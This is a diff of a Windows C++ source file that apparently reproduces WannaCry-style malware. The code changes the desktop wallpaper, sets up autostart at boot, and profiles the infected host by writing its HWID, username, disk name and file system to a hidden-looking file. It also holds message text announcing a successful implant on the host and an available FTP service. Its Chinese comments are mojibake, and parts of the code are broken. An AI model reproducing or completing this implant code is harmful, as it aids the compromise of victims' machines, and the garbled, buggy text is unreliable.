@@ -1,58 +1,59 @@
 #include "include/API.h"
 #include "include/API-2.h"
+
 ofstream ofs;
 ifstream ifs;
 
 string wstring2string(wstring wstr)
 {
     string result;
-    //»ñÈ¡»º³åÇø´óĞ¡£¬²¢ÉêÇë¿Õ¼ä£¬»º³åÇø´óĞ¡ÊÂ°´×Ö½Ú¼ÆËãµÄ  
+    //è·å–ç¼“å†²åŒºå¤§å°ï¼Œå¹¶ç”³è¯·ç©ºé—´ï¼Œç¼“å†²åŒºå¤§å°äº‹æŒ‰å­—èŠ‚è®¡ç®—çš„  
     int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
     char* buffer = new char[len + 1];
-    //¿í×Ö½Ú±àÂë×ª»»³É¶à×Ö½Ú±àÂë  
+    //å®½å­—èŠ‚ç¼–ç è½¬æ¢æˆå¤šå­—èŠ‚ç¼–ç   
     WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
     buffer[len] = '\0';
-    //É¾³ı»º³åÇø²¢·µ»ØÖµ  
+    //åˆ é™¤ç¼“å†²åŒºå¹¶è¿”å›å€¼  
     result.append(buffer);
     delete[] buffer;
     return result;
 }
 
 
-//¸ü¸ÄÏµÍ³×ÀÃæ
+//æ›´æ”¹ç³»ç»Ÿæ¡Œé¢
 void system_information_table() {
-    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCry¸´ÏÖ.jpg";
+    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCryå¤ç°.jpg";
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
 }
 
 
 string text_box_auto() {
-    string email_text_book = "³É¹¦Ö²ÈëËŞÖ÷»ú";
-    string email_text_neirong = "FTP¿ÉËæÊ±¿ªÆô·şÎñ£¡";
+    string email_text_book = "æˆåŠŸæ¤å…¥å®¿ä¸»æœº";
+    string email_text_neirong = "FTPå¯éšæ—¶å¼€å¯æœåŠ¡ï¼";
     return email_text_book+email_text_neirong;
 }
 
 
+ 
+ string HWID = GetHWID();   //HWID
+ string windows_user = windows_username();      //username
+ string system_box = system_information();          //disk
+ string system_text = system_information_text();    //filetype
 
 
 
-void fstream_double(string username,string computer_name) {
+void fstream_double() {
 	ofs.open("C:\\Windows sys\\computer_box.txt", ios::out);
-	ofs << "¼ÆËã»úÓÃ»§Ãû³Æ:" <<username<< endl;
-	ofs << "¼ÆËã»úÊ¶±ğÃû³Æ:" << computer_name << endl;
-    ofs << "ÏµÍ³ĞÅÏ¢:" << endl;
-    ofs << "CPUÓ²¼şĞÅÏ¢:" << endl;
-    ofs << "CPU-ID" << endl;
-    ofs << "Íø¿¨ĞÅÏ¢:" << endl;
-    ofs << "ÍøÂçÏÂÔØËÙ¶È:" << endl;
-    ofs << "ÍøÂçÏÂÔØËÙ¶È:" << endl;
-	
+	ofs << "è®¡ç®—æœºç”¨æˆ·åç§°:" <<windows_username<< endl;
+    ofs << "è®¾å¤‡HWID:" << HWID << endl;
+    ofs << "ç£ç›˜åç§°:" <<system_box <<endl;
+    ofs << "æ–‡ä»¶ç³»ç»Ÿï¼š" <<system_text<< endl;
 }
 
 
-//¿ª»ú×ÔÆô¶¯
+//å¼€æœºè‡ªå¯åŠ¨
 string userlc;
-//¿ª»ú×ÔÆô¶¯
+//å¼€æœºè‡ªå¯åŠ¨
 void AutoStart()
 {
     
@@ -90,7 +91,7 @@ void ifsteam_open_read() {
     ifs.open("C:\\Windows sys\\computer_box.txt", ios::in);
     if (!ifs.is_open())
     {
-        cout << "ÎÄ¼ş´ò¿ªÊ§°Ü" << endl;
+        cout << "æ–‡ä»¶æ‰“å¼€å¤±è´¥" << endl;
         return;
     }
     char c;
@@ -101,24 +102,69 @@ void ifsteam_open_read() {
     ifs.close();
 }
 
-//99_add_box
-void nianty_add_box() {
-    int i, j;
-    for (i = 1; i <= 9; i++)
-    {
-        for (j = 1; j <= 9; j++)
-        {
-            if (i >= 10 - j)
-            {
-                cout << i << "*" << j << "=" << setw(2) << i * j << "  ";
-            }
-            else
-            {
-                cout << "        ";
-            }
-        }
-        cout << endl;
-    }
+//GetVolumelnformationå…¨å±€å‚æ•°
+
+
+
+
+void c_box_information() {
+    TCHAR szvolumename[260] = { 0 };
+    DWORD dwvolumeserialnumber = 0;
+    DWORD dwmaxvolumename = 0;
+    DWORD dwfilesystemflgs = 0;
+    TCHAR szfilesystemname[260] = { 0 };
+    GetVolumeInformation(_T("C:\\"), szvolumename, 260, &dwvolumeserialnumber, &dwmaxvolumename, &dwfilesystemflgs, szfilesystemname, 260);
+    //printf("å·æ ‡åç§°ï¼š%s\nå·æ ‡åºåˆ—å·ï¼š%x\næ–‡ä»¶åç§°æœ€å¤§é•¿åº¦ï¼š%d\næ–‡ä»¶ç³»ç»Ÿæ ‡è¯†ï¼š%x\næ–‡ä»¶ç³»ç»Ÿåç§°:%s",
+    //    szvolumename, dwvolumeserialnumber, dwmaxvolumename, dwfilesystemflgs, szfilesystemname);
+    cout << "å·æ ‡åç§°ï¼š"<< szvolumename <<endl;
+    cout << "å·æ ‡åºåˆ—å·ï¼š" << dwvolumeserialnumber << endl;
+    cout << "æ–‡ä»¶åç§°æœ€å¤§é•¿åº¦ï¼š" << dwmaxvolumename << endl;
+    cout << "æ–‡ä»¶ç³»ç»Ÿæ ‡è¯†ï¼š" << dwfilesystemflgs << endl;
+    cout << "æ–‡ä»¶ç³»ç»Ÿåç§°" << szfilesystemname << endl;
+
+   /* TCHAR VolumeNameBuffer[MAX_PATH + 1], FileSystemNameBuffer[MAX_PATH];
+    DWORD VolumeSerialNumber, MaximumComponentLength, FileSystemFlags;
+    GetVolumeInformation(_T("C:\\"), VolumeNameBuffer, MAX_PATH + 1, &VolumeSerialNumber, &MaximumComponentLength, &FileSystemFlags, FileSystemNameBuffer, MAX_PATH + 1);*/
+    
+}
+   
+//system_dike_name
+
+string system_information() {
+    char szVolumeNameBuf[MAX_PATH] = { 0 };
+    DWORD dwVolumeSerialNum;
+    DWORD dwMaxComponentLength;
+    DWORD dwSysFlags;
+    char szFileSystemBuf[MAX_PATH] = { 0 };
+    DWORD dwFileSystemBuf = MAX_PATH;
+
+    BOOL bGet = GetVolumeInformationA("C:\\",
+        szVolumeNameBuf,
+        MAX_PATH,
+        &dwVolumeSerialNum,
+        &dwMaxComponentLength,
+        &dwSysFlags,
+        szFileSystemBuf,
+        MAX_PATH);
+    return szVolumeNameBuf;
 }
 
-    
+string system_information_text() {
+    char szVolumeNameBuf[MAX_PATH] = { 0 };
+    DWORD dwVolumeSerialNum;
+    DWORD dwMaxComponentLength;
+    DWORD dwSysFlags;
+    char szFileSystemBuf[MAX_PATH] = { 0 };
+    DWORD dwFileSystemBuf = MAX_PATH;
+
+    BOOL bGet = GetVolumeInformationA("C:\\",
+        szVolumeNameBuf,
+        MAX_PATH,
+        &dwVolumeSerialNum,
+        &dwMaxComponentLength,
+        &dwSysFlags,
+        szFileSystemBuf,
+        MAX_PATH);
+    return szFileSystemBuf;
+}
+
